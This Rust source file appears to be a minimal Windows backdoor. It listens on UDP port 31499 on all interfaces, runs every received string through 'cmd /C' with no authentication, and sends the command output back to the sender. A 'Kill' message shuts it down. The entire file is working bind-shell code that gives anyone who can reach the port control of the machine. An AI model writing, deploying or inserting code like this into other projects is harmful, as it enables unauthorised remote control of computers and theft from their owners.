use std::net::UdpSocket;
use std::process::Command;
use std::str;

mod commands;
use commands::{match_command, CommandList};

#[allow(unused_variables)]
#[allow(unused_assignments)]
fn main() {
    let localaddr: &str = "0.0.0.0:31499";
    let socket = UdpSocket::bind(localaddr).expect("");

    let command_received = "";

    loop {
        let mut buf = [0; 1000];
        let command_splited: Vec<&str>;

        let (number_of_bytes, src_addr) = socket.recv_from(&mut buf).expect("");
        let data_recv: &[u8] = &mut buf[..number_of_bytes];
        let command_received: &str = match str::from_utf8(data_recv) {
            Ok(v) => v,
            Err(e) => continue,
        };
        let cmd = match match_command(command_received) {
            CommandList::Error(e) => continue,
            CommandList::Kill => std::process::exit(0),
            CommandList::Exec(s) => {
                let output = Command::new("cmd")
                    .args(&["/C", &s])
                    .output()
                    .expect("failed to run command");

                output.stdout
            }
        };

        socket
            .send_to(&cmd, src_addr)
            .expect("Failed to send output");
    }
}
